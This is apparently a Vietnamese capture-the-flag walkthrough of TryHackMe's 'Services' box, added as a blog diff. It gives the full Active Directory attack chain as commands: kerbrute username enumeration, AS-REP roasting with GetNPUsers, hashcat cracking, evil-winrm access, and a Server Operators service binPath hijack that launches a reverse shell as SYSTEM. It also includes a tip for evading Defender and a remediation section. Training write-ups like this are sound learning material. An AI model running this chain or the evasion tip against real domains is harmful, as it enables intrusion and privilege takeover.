@@ -1,0 +1,198 @@
+---
+title: 'Services'
+description: 'Tên nhân viên trên website công ty trở thành username AD, một tài khoản tắt Kerberos pre-auth cho phép AS-REP roast, và việc thuộc nhóm Server Operators cho phép trỏ lại binary của một service để chạy dưới quyền SYSTEM.'
+date: 2026-01-10
+platform: tryhackme
+room: 'Services'
+roomUrl: 'https://tryhackme.com/room/services'
+difficulty: medium
+tags:
+  - 'active-directory'
+  - 'kerberos'
+  - 'asrep-roasting'
+  - 'password-cracking'
+  - 'windows'
+  - 'smb'
+  - 'privesc'
+vulnClasses:
+  - 'username enumeration'
+  - 'as-rep roasting'
+  - 'weak credentials'
+  - 'insecure privileged service'
+translation: done
+draft: false
+---
+
+## **Services — Từ Danh Bạ Nhân Sự Đến SYSTEM Domain Qua AS-REP Roasting và Server Operators**
+
+_Một bài walkthrough cho box "Services" của TryHackMe. Một website công ty bình thường liệt kê nhân viên theo họ tên đầy đủ; ta biến chúng thành username Active Directory, xác nhận bằng Kerberos, và tìm ra một tài khoản tắt pre-authentication — một lần AS-REP roast cho ta một hash crack được. User đã crack nằm trong_ _`Server Operators`\*\*, một nhóm đủ mạnh để trỏ lại binary của một service Windows và chạy payload với quyền_ _`SYSTEM`\*\*._
+
+> Flag, mật khẩu đã crack, và IP mục tiêu được ẩn. Services là box huấn luyện hợp pháp trên TryHackMe; mọi thao tác đều thực hiện trên một mục tiêu luyện tập được cho phép. Flag hiển thị dạng `THM{<redacted>}` và mật khẩu thu được dạng `<redacted>` — có thật trên box nhưng ẩn ở đây.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Trang "About us" của website làm lộ **họ tên đầy đủ nhân viên** và định dạng email `j.doe@services.local` → dựng username `f.lastname` và xác nhận bằng **kerbrute** (cả bốn đều hợp lệ) → **AS-REP roast** bằng `GetNPUsers` của Impacket: một tài khoản (`j.rock`) **tắt Kerberos pre-auth**, nên KDC phát ra một AS-REP mã hóa → crack bằng hashcat mode `18200` để lấy mật khẩu của `j.rock` → `evil-winrm` vào lấy `user.txt` → `whoami /all` cho thấy thuộc **`BUILTIN\Server Operators`** → nhóm đó có thể cấu hình lại service, nên ta trỏ binary của service `cfn-hup` vào reverse shell của mình, khởi động lại, và bắt được shell với tư cách **`nt authority\system`** → `root.txt`.
+
+Danh bạ nhân sự → user AD hợp lệ → AS-REP roast → crack → WinRM → service hijack của Server Operators → SYSTEM.
+
+</Callout>
+
+### **Mục tiêu**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+Lượt quét là một domain controller mẫu mực: DNS, IIS, Kerberos (88), LDAP, SMB, RDP, WinRM — domain `services.local`, host `WIN-SERVICES`:
+
+```text
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0  — "Above Services"
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp  open  ldap          services.local
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server commonName=WIN-SERVICES.services.local
+5985/tcp open  http          WinRM (Microsoft HTTPAPI 2.0)
+```
+
+SMB ẩn danh bị từ chối (`smbmap -u anonymous` → access denied), nên website là thứ duy nhất để đọc. Trang "About us" liệt kê nhân viên theo họ tên đầy đủ, và phần chân trang hiện một địa chỉ liên hệ `j.doe@services.local`.
+
+### **Lỗ hổng — tên là username, và một tài khoản bỏ qua pre-auth**
+
+Định dạng email tiết lộ quy ước đặt tên AD: chữ-cái-đầu-chấm-họ. Vậy một danh bạ nhân sự _chính là_ một danh sách username. Lỗi thật sự là một tài khoản bị cấu hình sai.
+
+<Callout type="insight">
+
+Khi một tài khoản AD đặt **"Do not require Kerberos pre-authentication"**, bất kỳ ai cũng có thể xin KDC một AS-REP của user đó và nhận về một khối **được mã hóa bằng khóa dẫn xuất từ mật khẩu của user** — không cần thông tin đăng nhập. Điều đó biến một username bị lộ thành một mục tiêu **crack mật khẩu offline** (AS-REP roasting). Chỉ cần một tài khoản có cờ này và một mật khẩu yếu.
+
+</Callout>
+
+### **Bước 1 — biến tên thành username đã xác nhận**
+
+Từ trang About, dựng các ứng viên `f.lastname` và xác nhận với KDC bằng kerbrute:
+
+```text
+cat users.txt
+# j.doe
+# j.rock
+# w.masters
+# j.larusso
+./kerbrute userenum --dc $IP -d services.local users.txt
+# [+] VALID USERNAME: j.larusso@services.local
+# [+] VALID USERNAME: j.doe@services.local
+# [+] VALID USERNAME: w.masters@services.local
+# [+] VALID USERNAME: j.rock@services.local
+```
+
+Cả bốn đều là tài khoản domain thật.
+
+### **Bước 2 — AS-REP roast**
+
+Xin KDC AS-REP cho từng user; một tài khoản trả về một hash:
+
+```text
+GetNPUsers.py -dc-ip $IP -request 'services.local/' -usersfile users.txt -format hashcat
+# [-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
+# $krb5asrep$23$j.rock@SERVICES.LOCAL:<hash...>
+# [-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
+# [-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+Chỉ `j.rock` tắt pre-auth — đúng cái cấu hình sai mà AS-REP roasting cần.
+
+### **Bước 3 — crack hash AS-REP**
+
+```text
+hashcat -m 18200 -a 0 j_rock_hash.txt rockyou.txt
+# $krb5asrep$23$j.rock@SERVICES.LOCAL:...:<redacted>
+```
+
+Mật khẩu đổ trước rockyou trong vài giây.
+
+### **Bước 4 — shell WinRM và flag user**
+
+`j.rock` nằm trong `Remote Management Users`, nên WinRM mở cho ta:
+
+```text
+evil-winrm -i $IP -u j.rock -p '<redacted>'
+*Evil-WinRM* PS C:\Users\j.rock\Desktop> cat user.txt
+# THM{<redacted>}
+```
+
+### **Bước 5 — lạm dụng Server Operators để lấy SYSTEM**
+
+`whoami /all` cho thấy membership then chốt:
+
+```text
+whoami /all
+# BUILTIN\Server Operators  Alias  S-1-5-32-549  Enabled group
+```
+
+Thành viên **Server Operators** có thể start, stop, và _cấu hình lại_ service — và một service mặc định chạy dưới `LocalSystem`. Liệt kê các service và chọn một cái được phép cấu hình lại (phần lớn báo `Access is denied`; `cfn-hup` thì không):
+
+```text
+services                      # enumerate service binaries
+```
+
+Xây một binary reverse-shell nhỏ, upload lên, trỏ lại `binPath` của service, và khởi động lại. Một reverse shell viết bằng C đã biên dịch giúp tránh Defender:
+
+```text
+# attacker: cross-compile a reverse shell to re.exe (mingw), then host a listener
+nc -lvnp 4444
+```
+
+```text
+# in the WinRM session
+upload re.exe
+sc.exe config cfn-hup binpath="C:\Users\j.rock\Documents\re.exe"
+# [SC] ChangeServiceConfig SUCCESS
+sc.exe start cfn-hup
+```
+
+Service khởi động binary của ta dưới quyền SYSTEM, và listener bắt được:
+
+```text
+nc -lvnp 4444
+# connect from $IP
+C:\Windows\system32> whoami
+# nt authority\system
+C:\Users\Administrator\Desktop> type root.txt
+# THM{<redacted>}
+```
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Một khởi đầu hoàn toàn không cần xác thực dẫn tới SYSTEM trên host domain:
+
+- **Lộ username + AS-REP roasting** — một danh bạ nhân sự công khai cộng một tài khoản không có Kerberos pre-auth cho ra một credential crack được mà không cần truy cập trước đó.
+- **Mật khẩu yếu** — hash AS-REP đổ trước một wordlist cơ bản, biến lần roast thành một login hợp lệ.
+- **Cấu hình lại service của Server Operators** — nhóm có thể trỏ lại binary của bất kỳ service nào và khởi động lại, chạy mã tùy ý dưới `LocalSystem`. Đó là con đường trực tiếp, chắc chắn tới SYSTEM trên DC.
+
+</Callout>
+
+### **Khuyến nghị khắc phục**
+
+<Callout type="fix">
+
+1. **Yêu cầu Kerberos pre-authentication trên mọi tài khoản.** Gỡ `DONT_REQ_PREAUTH` toàn tổ chức — nó chỉ tồn tại cho vài trường hợp tương thích legacy hiếm gặp và không bao giờ nên bật.
+2. **Áp dụng chính sách mật khẩu mạnh** để ngay cả một AS-REP hay NTLM hash bị lộ cũng kháng crack offline; ưu tiên managed/service account với secret ngẫu nhiên dài.
+3. **Gỡ người dùng khỏi Server Operators** trừ khi thật sự cần. Nó thực chất là SYSTEM trên host; hãy coi nó như Domain Admin. Kiểm toán ACL của service để user không đặc quyền không thể cấu hình lại `binPath`.
+4. **Giảm thiểu lộ username** — một trang web công khai không cần phơi bày chính xác quy ước đặt tên AD.
+
+</Callout>
+
+### **Bài học rút ra**
+
+- **Một danh bạ nhân sự là một danh sách username.** Một khi biết định dạng email, họ tên trở thành tài khoản AD — xác nhận bằng kerbrute trước khi chạm vào Kerberos.
+- **AS-REP roasting chỉ cần một tài khoản bất cẩn.** Không cần credential; một user `DONT_REQ_PREAUTH` duy nhất là một hash crack được offline.
+- **Server Operators là SYSTEM.** Quyền cấu hình lại service nghĩa là mã tùy ý dưới `LocalSystem` — chính membership đó _là_ bước privesc.
+- **Ưu tiên reverse shell biên dịch trên Windows** để né tránh các phát hiện dựa trên script khi đặt binary service.
+
+Cảm ơn bạn đã đọc. "Services" là một lời nhắc gọn gàng rằng con đường từ một website công khai đến SYSTEM trên một domain controller có thể chỉ là ba cấu hình sai Active Directory quen thuộc nối tiếp nhau.
